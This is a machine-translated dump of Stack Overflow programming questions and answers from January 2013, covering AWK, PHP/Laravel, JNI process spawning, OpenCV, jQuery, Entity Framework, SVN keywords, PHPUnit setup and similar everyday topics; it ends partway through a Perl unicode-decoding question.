> 赞同：0
> 
> 时间：2013-01-15T20:48:54.240
> 
> 标签：testing, integration-testing, soa, bdd, acceptance-testing

假设 SOA 层的边界处有一个 Web 应用程序。

如果我想创建一些验收测试来实践行为驱动开发，那么在两个部分都有不同的测试是否有意义：SOA 部分和 Web 应用程序部分？

例如，webapp 的验收测试将涉及 Selenium，因为验收测试确实促进了基于有用和真实应用程序使用的端到端测试。

但是服务呢？

简而言之，为了真正研究服务的行为和特性，SOA 部分是否需要像客户端应用程序那样编写一些故事？

或者集成测试是否足够？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-16T15:06:15.087

如果系统简单可能不会。

原则上，服务是独立的部署单元，可以在与直接或初始客户端（您的案例中的 Web 应用程序）不同的上下文中使用。例如，您可以将该服务直接公开给供应商或客户以与之集成等。

# awk - 在 AWK 中合并两行

> ID：14346647
> 
> 赞同：0
> 
> 时间：2013-01-15T20:49:07.027
> 
> 标签：awk

我的数据格式如下：

```
Ind1 0 1 2
Ind1 0 2 1
Ind2 1 1 0 
Ind2 2 2 0 
```

我想使用 AWK 来获得这个输出：

```
Ind1 00 12 21
Ind2 12 12 00 
```

即合并每两行具有相同的行名。

非常感谢您的帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-15T21:10:20.757

文件 a.awk：

```
{
    col2[$1] = col2[$1] $2
    col3[$1] = col3[$1] $3
    col4[$1] = col4[$1] $4
}

END {

    for ( i in col2 )
    {
        print i " " col2[i] " " col3[i] " " col4[i]
    }
} 
```

跑：

`cat data | awk -f a.awk`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-15T21:31:48.480

这个版本只假设所有应该分组的行都是连续的

```
awk '
    function output() {
        printf "%s", prev
        for (i=2; i<=NF; i++) 
            printf "%s%s", OFS, col[i]
        print ""
    }
    $1 != prev {
        if (NR != 1) 
            output()
        for (i=2; i<=NF; i++) 
            col[i] = $i
        prev = $1
        next 
    }
    { 
        for (i=2; i<=NF; i++) 
            col[i] = col[i] $i 
    }
    END {
        output()
    }
' 
```

# php - where to position laravel config file for driver

> ID：14346649
> 
> 赞同：0
> 
> 时间：2013-01-15T20:49:16.180
> 
> 标签：php, laravel

i am working my way through [http://net.tutsplus.com/tutorials/php/b](http://net.tutsplus.com/tutorials/php/b) … r-laravel/.

I have reached the following point:

```
Extending Auth
To keep our bundle entirely self contained, we’ll need to extend auth. This will allow     us to define a table just to login to our admin panel, and not interfere with the main application.
Before we create our custom driver, we'll create a configuration file, where you can     choose if you'd like to use the username or email columns from the database table.

return array(
    'username' => 'username',
    'password' => 'password',
); 
```

I don't understand what to name the config file, what are its contents and where it should go in the laravel 3.2 directory structure. I would appreciate any help.

Thanks in advance,

Bill

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-17T13:35:14.947

bundles > bundlename > config > bundlename.php

# c - 如何将标准输出重定向到子进程的标准输入？

> ID：14346650
> 
> 赞同：0
> 
> 时间：2013-01-15T20:49:18.950
> 
> 标签：c, java-native-interface, gpio

自从我使用 C 以来已经很久了，所以我为这个简单的问题道歉。

我正在 armeabi-v7a 设备上使用 GPIO。我需要从 android 应用程序中将 GPIO 接口导出到用户空间，并且我正在尝试从 JNI 库中这样做。

要从终端执行此操作，我只需运行`echo 199 > /sys/class/gpio/export`

但我需要从 JNI 做它:(

我当前的尝试看起来像这样（带有一些错误处理），但不起作用：

```
JNIEXPORT jboolean JNICALL Java_com_rnd_touchpanel_LED_exportGreen
    (JNIEnv * je, jclass jc)
{
    freopen("/sys/class/gpio/export", "w+", stdout);
    printf("198");
    fclose(stdout);
    return JNI_TRUE;
} 
```

然后我意识到导出实际上是二进制文件，而不仅仅是一个文件，而且我忘记了如何生成新进程并向它们发送输入等等。有人可以刷新我的记忆吗？谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-15T20:59:42.960

如果您只是在编写文件，则无需重定向`stdout`- 只需使用 打开文件`fopen(3)`，使用 写入文件[`fprintf(3)`](http://linux.die.net/man/3/fprintf)，然后使用 关闭文件`fclose(3)`。

如果您需要使用其标准上的给定数据执行另一个流程，您有几个选择：

*   用于[`system(3)`](http://linux.die.net/man/3/system)调用 shell 并为其提供所需的重定向
*   使用[`popen(3)`](http://linux.die.net/man/3/popen)与类型`"w"`和`fprintf`您的数据返回`FILE*`
*   使用[`fork(2)`](http://linux.die.net/man/2/fork)和[`exec*(3)`](http://linux.die.net/man/3/exec)生成新进程。在分叉之后但在执行之前，使用[`pipe(2)`](http://linux.die.net/man/2/pipe),[`dup2(2)`](http://linux.die.net/man/2/dup2)和[`close(2)`](http://linux.die.net/man/2/close)适当地设置新进程的标准输入。然后，您可以从父进程写入该文件描述符以设置数据。这是最复杂的选项，但它使您可以最大程度地控制子进程的设置方式。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-15T20:55:41.150

已经有一段时间了，因为我已经做了很多 C/C++，但我相信产生一个新进程是通过 popen 完成的。例如：

```
FILE* pOutput = popen("/usr/bin/python myscript.py", "r");
  while ( fgets(line, 199, pOutput) )
  {
    printf("%5d: %s", entry++, line);
  } 
```

从关于 S/O 的另一篇文章看来，如果您以写入模式打开 proc，您似乎可以写入 popen 返回的 FILE*：

```
FILE * file = popen("/bin/cat", "w");
fwrite("hello", 5, file);
pclose(file); 
```

# java - 人脸识别 cvCalcEigenObjects

> ID：14346652
> 
> 赞同：1
> 
> 时间：2013-01-15T20:49:27.900
> 
> 标签：java, android, opencv, javacv, face-recognition

我在这里遇到了一些问题

```
// compute average image, eigenvalues, and eigenvectors
    cvCalcEigenObjects(nTrainFaces, // nObjects
            new PointerPointer(trainingFaceImgArr), // input
            new PointerPointer(eigenVectArr), // output
            CV_EIGOBJ_NO_CALLBACK, // ioFlags
            0, // ioBufSize
            null, // userData
            calcLimit, pAvgTrainImg, // avg
            eigenValMat.data_fl()); // eigVals 
```

有什么想法吗？我只是在我的 IplImage[] 数组中加载彩色 jpg 脸，但我卡在这行代码上。

这是我的示例代码

```
public void learn(final String trainingFileName) {
    int i;
    long startTime = System.nanoTime();

    trainingFaceImgArr = loadFaceImgArray(trainingFileName);
    nTrainFaces = trainingFaceImgArr.length;
    L.wtf("trainFaceImgArr length"+trainingFaceImgArr.length);
    if (nTrainFaces < 3) {
        L.wtf( "Need 3 or more training faces\n"
                + "Input file contains only " + nTrainFaces);
        return;
    }
    // do Principal Component Analysis on the training faces
    doPCA();
}
private void doPCA() {
    int i;
    CvTermCriteria calcLimit;
    CvSize faceImgSize = new CvSize();

    // set the number of eigenvalues to use
    nEigens = nTrainFaces - 1;

    L.wtf("allocating images for principal component analysis, using "
            + nEigens + (nEigens == 1 ? " eigenvalue" : " eigenvalues"));

    // allocate the eigenvector images
    faceImgSize.width(trainingFaceImgArr[0].width());
    faceImgSize.height(trainingFaceImgArr[0].height());
    eigenVectArr = new IplImage[nEigens];
    for (i = 0; i < nEigens; i++) {
        eigenVectArr[i] = cvCreateImage(faceImgSize, // size
                IPL_DEPTH_32F, // depth
                1); // channels
    }

    // allocate the eigenvalue array
    eigenValMat = cvCreateMat(1, // rows
            nEigens, // cols
            CV_32FC1); // type, 32-bit float, 1 channel

    // allocate the averaged image
    pAvgTrainImg = cvCreateImage(faceImgSize, // size
            IPL_DEPTH_32F, // depth
            1); // channels

    // set the PCA termination criterion
    calcLimit = cvTermCriteria(CV_TERMCRIT_ITER, // type
            nEigens, // max_iter
            1); // epsilon

    L.wtf("computing average image, eigenvalues and eigenvectors");
    // compute average image, eigenvalues, and eigenvectors
    cvCalcEigenObjects(nTrainFaces, // nObjects
            new PointerPointer(trainingFaceImgArr), // input
            new PointerPointer(eigenVectArr), // output
            CV_EIGOBJ_NO_CALLBACK, // ioFlags
            0, // ioBufSize
            null, // userData
            calcLimit, pAvgTrainImg, // avg
            eigenValMat.data_fl()); // eigVals 
```

# asp.net-mvc - EF5 如何正确映射和提交相关数据

> ID：14346657
> 
> 赞同：0
> 
> 时间：2013-01-15T20:49:54.953
> 
> 标签：asp.net-mvc, entity-framework, mapping, many-to-many, relationship

我有两个具有多对多关系的模型：

```
public class Reference
{
    public int Id { get; set;}
    public virtual ICollection<Category> Categories { get; set; }
}
public class Category
{
    public int CategoryId { get; set; }
    public string Name { get; set; }
    public virtual ICollection<Reference> References { get; set; }
} 
```

在我为我的`Reference`条目创建的视图中，我有多个可用的下拉列表列表`Categories`。这意味着在创建上可以关联`Reference`多个现有的（通过关系表显而易见）。`Categories``Reference`

现在提交数据的正常 ActionResult 如下所示：

```
[HttpPost]
public ActionResult Create(Reference reference)
{
    if (ModelState.IsValid)
    {
        db.References.Add(reference);
        db.SaveChanges();
    }
} 
```

运行此代码将导致`Categories`创建新的。`Categories`这些新的和新的之间的关系`Reference`被创建。并从下拉列表`Category.Name`中设置为。`SelectedValue`

**您将如何确保正确映射和提交数据？**

# java - Linux 上的 Subversion 标签填充自动更新

> ID：14346665
> 
> 赞同：0
> 
> 时间：2013-01-15T20:50:16.757
> 
> 标签：java, linux, svn

有人可以告诉我如何在linux上获得Subversion Tag Fill Automatic Update ..

在您编写的 JavaDoc 部分中：

```
/**
 * @version $Date$ $Author$
 */ 
```

如何告诉我的 svn 客户端在 Linux 上自动填充 $Author$ 和 $Date$ ..

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-15T21:51:41.607

引用[文档](http://svnbook.red-bean.com/en/1.7/svn.advanced.props.special.keywords.html)：

> 只需将关键字锚文本添加到您的文件中并没有什么特别的。Subversion 永远不会尝试对您的文件内容执行文本替换，除非明确要求这样做 [...] svn:keywords 属性，当在版本化文件上设置时，控制将在该文件上替换哪些关键字

他们举了一个你想要的关键字的例子：

```
svn propset svn:keywords "Date Author" YOURFILE 
```

设置属性后不要忘记提交。

# php - 通过向数据库添加空键并使用编辑表单来消除“新”表单

> ID：14346667
> 
> 赞同：0
> 
> 时间：2013-01-15T20:50:20.340
> 
> 标签：php, mysql, forms

我希望标题不是太清楚..

假设我们正在使用用户数据库编写（Web）应用程序的后端。有用户，这些用户还有其他管理员可以连接到他们的东西，比如管理员笔记等。

例如，您必须编写的管理员注释：

1.  用于创建和填写注释的表格；
2.  必要时编辑注释的表格；
3.  用于查看笔记的查看页面（带有删除和编辑按钮）

现在我感觉很懒（而且我确信我并不孤单；]）并且我不想编写额外的代码。所以我正在考虑“消除” Create 表单。

相反，我现在的计划是：

创建一个按钮“新建”。单击该按钮时，它将在 MySQL 表中创建一个带有空行的键。创建后，它将重定向到该行的编辑页面。当然，一切都是空的，可以立即添加信息。

问题 1：如果有人离开此编辑页面，我知道 MySQL 表中将保留一个空键。问题解决方案：简单检查和删除空行。

还会出现什么其他问题（除了不切实际的高 id（主键））？

期待大家的想法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T20:55:05.340

一个更简单的解决方案是编写表单，使其期望与您正在处理的数据绑定 - 当您处理某事的新实例时，表单将绑定为空/默认数据 - 当您处理现有实例时，它会与该实例绑定（或者，当您处理“新”实例时 - 构造实例以将其绑定到表单，但实际上并不保存它）。

通过这种方式，您仍然拥有传统的创建/编辑页面，但您只需要实现一次表单逻辑（并且您不必担心保持数据库与实际保存的内容同步）。

# javascript - JavaScript - 具有更改参数的递归函数（插件？），直到达到数字（jQuery）

> ID：14346669
> 
> 赞同：1
> 
> 时间：2013-01-15T20:50:30.347
> 
> 标签：javascript, jquery, animation

我正在寻找改进我用 jQuery 编写的脚本来做一些将多个动画链接在一起的动画（在某种程度上是时间轴序列）。我不想手动链接每个单独的动画，而是想编写一个函数来替换每个动画中的一些标准元素。

诚然，我没有 JavaScript 知识来了解实现此目的的最佳实践；话虽如此，一些指针/例子会很棒。

这是我所拥有的：

```
function itemsFirstAnim() {

    // Define each target div
    var one = $(".one");
    var two = $(".two");
    var three = $(".three");
    var four = $(".four");
    var five = $(".five");
    var six = $(".six");
    var seven = $(".seven");
    var eight = $(".eight");
    var nine = $(".nine");
    var ten = $(".ten");
    var eleven = $(".eleven");
    var twelve = $(".twelve");

    // Show a block (opacity 1), give the overlay a position, show and animate it
    twelve.css("opacity", 1).children(".overlay").show().animate({ right: "100%" }, 750, function() {
        // cover the block with the overlay when the animation is done
        twelve.children('.overlay').css({ right: 0 });

        eleven.css("opacity", 1).children(".overlay").show().animate({ bottom: "100%" }, 750, function() {      
            eleven.children('.overlay').css({ bottom: 0 });

            seven.css("opacity", 1).children(".overlay").show().animate({ right: "100%" }, 750, function() {
                seven.children(".overlay").css({ right: 0 });

                and so on....
        });         
        });

    });
} 
```

理想情况下，我希望有参数`target`并`direction`替换初始选择器（即`twelve`）和它的动画方向（即`right: "100%"`）。由于每个`target`and`direction`都是不同的，我不能只编写一个函数并在其内部调用它，除非我将它嵌套 12 次，这似乎充其量也是初级的。

最后，我希望这个函数（或者可能是一个插件？）在所有 12 个都被应用后停止执行。

不幸的是，动画的顺序不是连续的（如示例中所示。但是，我确实知道要制作动画的数字的顺序）。

这是我所拥有的一个例子：http: [//codepen.io/anon/full/Dxzpj](http://codepen.io/anon/full/Dxzpj)

如果有人有任何见解，将不胜感激。谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-15T21:11:55.563

这不是特别漂亮，但是您可以使用自定义队列自定义动画的顺序；见[`queue`](http://api.jquery.com/queue/)和[`dequeue`](http://api.jquery.com/dequeue/)功能。

一个简单的示例可能如下所示：

```
$(function () {
  // Use the body to track the animation queue; you can use whatever
  // element you want, though, since we're using a custom queue name
  var $body = $(document.body);

  // Helper functions to cut down on the noise
  var continue_queue = function () {
    $body.dequeue("my-fx");
  };
  var add_to_queue = function (cb) {
    $body.queue("my-fx", cb);
  };

  // Define your queue.  Be sure to use continue_queue as the callback
  add_to_queue(function () {
    $('#one').animate({ height: '8em' }, 750, continue_queue);
  });
  add_to_queue(function () {
    $('#two').animate({ width: '8em' }, 750, continue_queue);
  });

  // Need to call this once to start the sequence
  continue_queue();
}); 
```

`<body>`这将使用附加到元素的单独队列来跟踪整个动画的进度。当动画的每个部分完成时，它会调用`continue_queue()`以指示下一部分应该运行。

您可以使用这种方法零碎地构建动画——在单独的函数、循环等中。它实际上不会开始运行，直到您触发它。

[你可以在jsfiddle](http://jsfiddle.net/NqFtF/1/)上看到这个直播并搞砸它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-15T21:13:36.607

如果您对所有元素应用相同的设置，那么简单的递归可能会有很大帮助。

```
 var $els = $('#one, #two, #three'); // collect all your elements in an array

  (function recursive(el) {
    el.animate({height: '100px'}, 800, function() {
          if (el.next()) recursive(el.next()); // if there are more, run the function again
    });
  })($els.eq(0)); //start with the first one 
```

[工作示例](http://jsfiddle.net/uyGGk/2/)

# ios - 具有多个电子邮件客户端的 MFMailComposeViewController

> ID：14346672
> 
> 赞同：1
> 
> 时间：2013-01-15T20:50:41.557
> 
> 标签：ios, mfmailcomposeviewcontroller

所以 MFMailComposeViewController 使用 Mail.app 的电子邮件帐户对吗？如果mail.app中配置了多个账号怎么办？有没有办法让用户在发送前选择帐户？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-15T20:52:47.607

不是在发送之前，而是当作曲家出现时，用户可以点击“发件人”行，然后会弹出一个选择器，其中包含所有可能的电子邮件地址。

默认值将是用户在邮件设置中设置为默认值的任何内容。

# php - 如何在 Windows 笔记本电脑上本地设置 PHPUnit？

> ID：14346677
> 
> 赞同：2
> 
> 时间：2013-01-15T20:51:06.670
> 
> 标签：php, terminal, phpunit

我的笔记本电脑上没有与 PHP 相关的软件。我知道如何用 PHP 编写代码，并且以前通过 Eclipse 使用过 Subversion，它连接到 Web 服务器，但不幸的是，我很难找到任何可以告诉您如何在包括 PHPUnit 在内的本地机器上创建 PHP 设置的东西，以便我可以练习测试带动发展。

任何意见，将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-15T20:59:12.307

最简单的方法可能是使用[**XAMPP**](http://www.apachefriends.org/en/xampp.html)，因为它已经安装了 PEAR 环境。

先安装 XAMPP，然后要安装 PHPUnit，点击 XAMPP 控制面板中的“Shell”按钮并输入以下命令：

```
pear channel-discover pear.phpunit.de
pear channel-discover pear.symfony.com
pear channel-discover components.ez.no

pear install --alldeps phpunit/PHPUnit 
```

# error-handling - 如何判断哪个订阅者将事件放入错误队列？

> ID：14346679
> 
> 赞同：0
> 
> 时间：2013-01-15T20:51:20.570
> 
> 标签：error-handling, nservicebus

我们有多个订阅者订阅同一个事件。其中之一很少引发异常并将事件放入错误队列。是否有可能从错误队列中的事件中，我可以知道是哪个订阅者导致了问题？例如，我可以在错误队列中发生异常的事件中获取调用堆栈吗？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T22:06:07.270

您需要像[Queue Explorer](http://www.cogin.com/mq/index.php)这样的工具来查看错误队列上的消息头。

使用 QE，您需要做的就是打开您感兴趣的消息并查看扩展选项卡（XML 查看器），这将向您显示相当多的信息，包括堆栈跟踪和导致错误的订阅者地址。

请参阅下面的示例： ![在此处输入图像描述](../Images/8610ac78ddb7edbb318e1d95d2128eb3.png)

我希望这有帮助！

# c# - 根据它是否是 XMLElement 的属性来控制 Class 的 XmlSerializer

> ID：14346681
> 
> 赞同：0
> 
> 时间：2013-01-15T20:51:27.947
> 
> 标签：c#, .net, xml-serialization

我有一个作为变量包含在其他类中的类，需要与其他类一起序列化为 XML。在某些类中，它将作为属性包含在内，其余的将是一个元素。有没有一种简单的方法可以使用`XMLSerializer`.

为了使这一点更清楚，这里举个例子。我有课`B`：

```
public class B {

    public string name { get; set; }

    public string description { get; set; }

    public B() { }

    public B(string name, string description) {
        this.name = name;
        this.description = description;
    }
} 
```

然后类`A`：

```
public class A {
    [XmlAttribute("aName")]
    public string name { get; set; }

    [XmlAttribute("bName")]
    public B b { get; set; }

    public A() { }

    public A (string name, B b){
        this.name = name;
        this.b = b;
    }                
} 
```

然后序列化它我做：

```
XmlSerializer serializer = new XmlSerializer(typeof(A));
TextWriter textWriter = new StreamWriter(@"C:\Test.xml");
serializer.Serialize(textWriter, new A("A Name", new B("B Name", "B Description")));
textWriter.Close(); 
```

我知道我可以将 Class 更改`A`为：

```
public class A {
    [XmlAttribute("aName")]
    public string name { get; set; }

    [XmlIgnore]
    public B b { get; set; }

    [XmlAttribute("bName")]
    public string bXml {get{return b==null ? null : b.name;} set{this.b = new B(value, null);}}

    public A() { }

    public A (string name, B b){
        this.name = name;
        this.b = b;
    }                
} 
```

但是由于这发生在多个位置，所以不必`bXML`在每个想要将其用作属性而不是元素的类中添加 。我希望有一种方法可以在我想要的时候设置一个转换器，或者甚至将代码添加到 Class `B`for `asAttribute`and `asElement`。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-15T22:34:54.703

通过实现 IXmlSerializable，您可以完全控制在序列化时生成的 xml。

[http://msdn.microsoft.com/en-us/library/system.xml.serialization.ixmlserializable.aspx](http://msdn.microsoft.com/en-us/library/system.xml.serialization.ixmlserializable.aspx)

# jquery - Ajax .load() 特定的 div

> ID：14346682
> 
> 赞同：0
> 
> 时间：2013-01-15T20:51:28.863
> 
> 标签：jquery, ajax

我有一个 div *(#slide2)*，我想在其中加载其他 .php 文件的一部分*（div.side 中的内容）*。这是我到目前为止得到的：

```
function uniqueId() { return new Date().getTime() };

$(function() {  
    $("#slide2").load("content01.php?uid= .slide"+uniqueId(), function() {
        applyRestOfJqueryAfterAjaxLoads();
    )};
});

function applyRestOfJqueryAfterAjaxLoads() {
    $('#slides').superslides({
        slide_easing: 'easeInOutCubic',
        slide_speed: 800,
        pagination: true,
        hashchange: true,
        scrollabe: true
    });
}); 
```

谢谢您的帮助！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-15T21:18:23.453

试试这个代码

```
$(function() {  
    $("#slide2").load("content01.php #slide"+uniqueId(), function() {
        applyRestOfJqueryAfterAjaxLoads();
    )};
}); 
```

请注意，这`"#slide"+uniqueId()`将返回您要加载的内容的 id

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-17T01:51:09.633

所以我不得不在 uniqueId 之后附加选定的内容（#slide2）

使用 UniqueId 以便 IE 和其他获取最新内容，而不是缓存的内容。

```
function uniqueId() { return new Date().getTime() }; // So that IE gets the newest content
   $(function() { $("#slide2").load("content01.php?"+uniqueId()+" #slide", function(){
      applyRestOfJqueryAfterAjaxLoads();
      });

   function applyRestOfJqueryAfterAjaxLoads() {
   // All the code I need to re-initialise
   }
}); 
```

虽然它确实工作得很好，但这似乎是一个错误？

# android - Android Listview滚动到特定位置

> ID：14346688
> 
> 赞同：0
> 
> 时间：2013-01-15T20:51:52.617
> 
> 标签：android

我已经覆盖了这样的列表视图滚动行为：

```
myListView.setOnScrollListener(new OnScrollListener() {

            @Override
            public void onScroll(AbsListView view, int firstVisibleItem,
                    int visibleItemCount, int totalItemCount) {
                // TODO Auto-generated method stub

            }

            @Override
            public void onScrollStateChanged(AbsListView view, int scrollState) {

                 if (scrollState == OnScrollListener.SCROLL_STATE_IDLE) {

                    }

            }

        }); 
```

谁能告诉我滚动完成后滚动到最近项目位置的最佳方式是什么。（例如客户向下或向上滚动）。我尝试使用例如 mylist.SmoothScrollToPosition()，但随后它一一滚动到最后我使用的是 Android 2.2

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-15T21:15:24.113

未经测试！

当滚动状态从 fling/touch 切换到 idle 时，可以检测到 AbsListView 中的第一个可见项。然后只需调用`smoothScrollToPosition`您的列表视图。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-10-08T10:19:27.950

您可以使用下方滚动到您上次访问的地点。

```
List<Item> myListData = ...;
for(Item item : myListData){
    if(isNextItem(Item){
        listView.smoothScrollToPosition(myListData.indexOf(item));
        break;
    }
} 
```

或者如果你知道你的`position of item`，你可以简单地打电话

```
listView.smootchScrollToPosition(position); 
```

# jquery - 将 jquery ui 工具提示添加到标签

> ID：14346694
> 
> 赞同：0
> 
> 时间：2013-01-15T20:52:22.433
> 
> 标签：jquery, jquery-load, jquery-ui-tooltip

我的代码中有 1 到 10 个标签，需要添加 jquery ui 工具提示。

a标签都有一类工具

a 标签都有一个 title 属性，其中包含我想在工具提示中显示的内容。

我的问题是如何遍历 a 标签

IE

$( ".tool" ).tooltip({ 内容: });

努力解决这个问题 - 任何人都可以帮助我解决所需的逻辑/代码吗？因为可能不止一个，所以我有点困惑。

可能使它稍微更令人困惑的是，这些标签都是通过 ajax .load 输入到页面中的

感谢期待可以提供的任何帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-15T20:59:28.763

试试这个。

```
 $('.tool').tooltip({
      content: function() {
        var element = $( this );
        return 'content';
        //return element.attr( "title" ); //or like this
      }
    }); 
```

# php - 使用 GET 将多个值从 ajax 发送到 url 中的 php

> ID：14346695
> 
> 赞同：0
> 
> 时间：2013-01-15T20:52:27.487
> 
> 标签：php, javascript, ajax

我想使用 ajax 向 php 发送 2 个值。当我使用一个变量时，它工作正常，但是当我使用 2 个变量时，查询不再在`php`文件中工作。

```
$.ajax({ 
    url:'page.php?suplier_id='+suplierNameMain+'&quality_id='+qualityNameMain,
        method:'GET', success:function(data) {
}); 
```

如果我只使用`supplier_id`，一切都会很好。

PS`qualityNameMain`显示正确的值`console.log()`

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-15T20:56:34.023

我确定它不相关，但没有理由构建您自己的查询字符串。请改用该`data`属性，正如 Barmar 指出的那样，它将正确地对您的参数进行 URL 编码：

```
$.ajax({
    url: 'page.php',
    data: {
        'suplier_id': suplierNameMain,
        'quality_id': qualityNameMain
    },
    success: function(data) {
        /* Whatever */
    }
}); 
```

请注意，`method`您的示例对 jQuery 无效（有一个在和`type`之间切换的设置），但它是默认设置，因此您不妨完全排除它。`GET``POST``GET`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-15T20:58:39.997

像这样使用`.ajax`：

```
$.ajax({
    url: 'page.php',
    type: 'GET',
    data: {'suplier_id': suplierNameMain, 
           'quality_id': qualityNameMain
           }

    success: function(data) {
    }
 ); 
```

# php - jquery load 没有显示特定的href

> ID：14346696
> 
> 赞同：0
> 
> 时间：2013-01-15T20:52:29.923
> 
> 标签：php, jquery, ajax, load

当用户在数据库中添加一行时，我正在尝试使用 jQuery 加载功能更新页面。

这是我的代码：

**PHP 文件：**

```
$blogs = getBlogsFromDB();
foreach ($blogs as $blog) {
    if (strlen($blog["title"]) > 23) {
        $blog["title"] = substr($blog["title"], 0, 20) . '...';
    }

    echo '<div class="image-box">
            <span class="drag-pointer">&nbsp;</span>
            <!-- Blog picture -->
            <div class="blog-picture">
                <a href="' . $blog["url"] . '" target="_blank"><img src="' . $blog["avatar"] . '" alt="" /></a>
            </div>
            <!-- end blog picture -->

            <!-- blog name -->
            <p class="blog-name"><a href="' . getBlogUsername($blog["url"]) . '" target="_blank" />' . $blog["title"] . '</a></p>
            <!-- end blog name -->

        </div>';
} 
```

这是**jQuery部分：**

```
$.ajax({
    type: "POST",
    url: "add_blog.php",
    data: dataString,
    dataType: 'json',
    success: function(response) {
        if (response.status == "1")
        {
            $('#add-blog').html("<div id='message'></div>");
            $('#message').html("<h2>Success! Your blog is added!</h2>")
            .hide()
            .fadeIn(500, function() {
                $('#message').append("<img id='checkmark' src='js/images/check.png' />");
            });
            $('#blogs').load('blogs.php');
        }
    }
}); 
```

在数据库中添加一行后，blogs.php 已加载到页面上，但未显示这些链接：

```
 <!-- blog name -->
                <p class="blog-name"><a href="' . getBlogUsername($blog["url"]) . '" target="_blank" />' . $blog["title"] . '</a></p>
                <!-- end blog name --> 
```

我确定问题不在 PHP 函数中，因为我尝试过使用硬编码的 URL。它只显示标题($blog["title"])。

PS：我尝试使用 Firebug 对其进行调试，但那里似乎一切正常。

任何帮助将不胜感激！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T20:55:18.453

在没有看到生成的 html 的情况下，我会说问题出在自闭合`a`标签上：

```
<a href="' . getBlogUsername($blog["url"]) . '" target="_blank" />
                                                                ^ here 
```

只需将其更改为：

```
<a href="' . getBlogUsername($blog["url"]) . '" target="_blank"> 
```

# ios - OpenCV 断言失败 CV_IS_MASK_ARR(mask)

> ID：14346700
> 
> 赞同：0
> 
> 时间：2013-01-15T20:52:48.193
> 
> 标签：ios, image-processing, opencv, morphing

我正在使用示例 iOS 项目中的一些通用 OpenCV 函数，并在`cvFindFundamentalMAT`调用函数时出现以下错误：

```
OpenCV Error: Assertion failed (CV_IS_MASK_ARR(mask) && CV_IS_MAT_CONT(mask->type) 
&& (mask->rows == 1 || mask->cols == 1) && mask->rows*mask->cols == count) in 
cvFindFundamentalMat 
```

该函数似乎发生了错误：

```
int calcFundamental(){

if(allPoints.size() != points_count) return -1;

// preparo la matrice delle corrispodenze

points1 = cvCreateMat(2,allPoints.size()/2,CV_32F);
points2 = cvCreateMat(2,allPoints.size()/2,CV_32F);
int count = std::max(points1->cols,points1->rows);
CvMat* status = cvCreateMat(1,count,CV_32F);
std::cout << "status->rows: " << status->rows <<"status->cols: " << status->cols << "count: "<< count << std::endl;
for(int j = 0; j < allPoints.size(); j++){

    if(j%2==0){
        std::cout << allPoints.at(j).x << ' ' << allPoints.at(j).y << std::endl;
        cvSetReal2D(points1,0,j-(int)round(j/2),allPoints.at(j).x);
        cvSetReal2D(points1,1,j-(int)round(j/2),allPoints.at(j).y);
    }else{
        std::cout << allPoints.at(j).x << ' ' << allPoints.at(j).y << std::endl;
        cvSetReal2D(points2,0,j-(int)round(j/2)-1,allPoints.at(j).x);
        cvSetReal2D(points2,1,j-(int)round(j/2)-1,allPoints.at(j).y);
    }
}

fundMat = cvCreateMat(3,3,CV_32F);
int num = 0;
num = cvFindFundamentalMat(points1,points2,fundMat,CV_FM_8POINT,1.0,0.9999,status);

return num; 
```

}

任何方向将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-16T02:54:32.767

更改`CvMat* status = cvCreateMat(1,count,CV_32F);`为`CvMat* status = cvCreateMat(1,count,CV_8UC1);`

# perl - 在 Perl 中解码 unicode 值

> ID：14346703
> 
> 赞同：0
> 
> 时间：2013-01-15T20:52:52.997
> 
> 标签：perl, unicode, decode

试图解码从服务器返回的大量信息。

实际上我只是打印出返回的数据，数据本身是正确的，除了我得到'\u003c'而不是'<'等......我正在尝试将所有这些转换为实际字符！

# 编辑：

代码：

```
$url = "http://people.gaa.ie/club/fixResult.jsp?callback=?&clubID=1329&compID=6785&leagueTable=N&colour=1E58AC";
$content = get($url);

print $content; 
```

# 输出片段是：

```
parseJSON({"content":"\u003cdiv id\u003d\"fixtures\"\u003e\n\u003cdiv class\u003d\"aFixture\" style\u003d\"display:none;\"\u003e\n\t\u003ch5 class\u003d\"primaryColor\"\u003eSenior Football Championship Group Two\t\u003c/h5\u003e\n\t\u003ch5 class\u003d\"primaryColor\"\u003e20.04.12 (Fri)\u003c/h5\u003e\n\t\u003cul class\u003d\"fixtures_list\"\u003e\n\t\t\u003cli\u003e\n\t\t\t\u003cp style\u003d\"font-weight:bold;\"\u003e\n\t\t\t\tRound 1\n\t\t\t\u003c/p\u003e\n\t\t\t\u003cp\u003e\n\t\t\t\t\u003cspan class\u003d\"teams\"\u003e\u003ca href\u003d\"#\" onclick\u003d\"Javascript:loadContent(\u0027clubID\u003d1329\u0026compID\u003d6785\u0026leagueTable\u003dY\u0026colour\u003d1E58AC\u0027);\"\u003eClashmore/Kinsalebeg\u003c/a\u003e\u003c/span\u003e\u0026nbsp;1-9\u0026nbsp;V\u0026nbsp;0-8\u0026nbsp;\u003cspan class\u003d\"teams\"\u003e\u003ca href\u003d\"#\" 